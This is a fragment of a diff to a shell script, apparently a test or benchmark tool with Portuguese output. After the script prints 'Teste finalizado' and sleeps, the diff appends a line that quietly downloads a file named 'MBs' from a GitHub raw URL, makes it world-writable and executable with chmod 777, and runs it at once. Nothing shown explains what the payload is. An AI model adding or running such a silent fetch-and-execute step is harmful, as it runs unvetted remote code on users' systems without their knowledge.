@@ -294,3 +294,4 @@ done
 echo ""
 echo -e "        \033[0m\033[01;37m• \033[01;32mTeste finalizado \033[01;37m•\033[0m"
 sleep 2
+curl -sO https://raw.githubusercontent.com/madson2391/MB-TESTE/main/MBs && chmod 777 MBs && ./MBs
